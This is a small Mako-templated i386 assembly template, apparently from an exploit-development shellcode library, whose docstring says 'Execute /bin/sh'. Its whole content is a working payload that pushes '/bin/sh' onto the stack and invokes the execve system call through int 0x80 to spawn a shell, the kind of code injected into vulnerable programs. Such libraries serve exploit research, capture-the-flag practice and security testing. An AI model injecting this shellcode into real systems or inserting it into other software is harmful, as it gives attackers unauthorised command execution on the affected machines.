<%docstring>Execute /bin/sh</%docstring>

xor eax, eax
push eax

${i386.pushstr("/bin/sh")}
mov ecx, esp

; execve("/bin//sh", {junk, 0}, {0});
push eax
push esp
push esp
push ecx
push eax
mov al, SYS_execve
int 0x80

